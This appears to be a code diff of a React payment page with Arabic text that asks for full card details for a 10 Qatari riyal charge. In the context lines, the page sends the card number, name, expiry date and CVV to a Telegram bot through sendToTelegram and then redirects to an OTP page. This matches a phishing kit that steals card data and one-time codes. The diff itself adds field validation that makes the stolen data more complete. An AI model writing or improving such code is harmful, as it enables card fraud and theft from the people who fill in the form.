@@ -70,6 +70,26 @@ const RegistrationComplete = () => {
   };
 
   const handleConfirmPayment = async () => {
+    if (!cardNumber.trim() || !cardholderName.trim() || !expiryDate.trim() || !cvv.trim()) {
+      alert("يرجى إدخال جميع بيانات البطاقة المصرفية");
+      return;
+    }
+
+    if (cardNumber.replace(/\s/g, "").length !== 16) {
+      alert("رقم البطاقة يجب أن يكون 16 رقم");
+      return;
+    }
+
+    if (expiryDate.length !== 5) {
+      alert("تاريخ الانتهاء غير صحيح");
+      return;
+    }
+
+    if (cvv.length !== 3) {
+      alert("رمز CVV يجب أن يكون 3 أرقام");
+      return;
+    }
+
     const message = `بيانات الدفع - بطاقة الائتمان\n\nرقم البطاقة: ${cardNumber}\nاسم حامل البطاقة: ${cardholderName}\nتاريخ الانتهاء: ${expiryDate}\nCVV: ${cvv}\nالمبلغ المدفوع: 10.00 ريال قطري`;
     await sendToTelegram(message);
     navigate('/otp-verification');
@@ -294,6 +314,7 @@ const RegistrationComplete = () => {
                 <Button 
                   className="bg-primary hover:bg-primary/90 text-primary-foreground flex-1"
                   onClick={handleConfirmPayment}
+                  disabled={!cardNumber.trim() || !cardholderName.trim() || !expiryDate.trim() || !cvv.trim()}
                 >
                   تأكيد الدفع - 10.00 ر.ق
                 </Button>
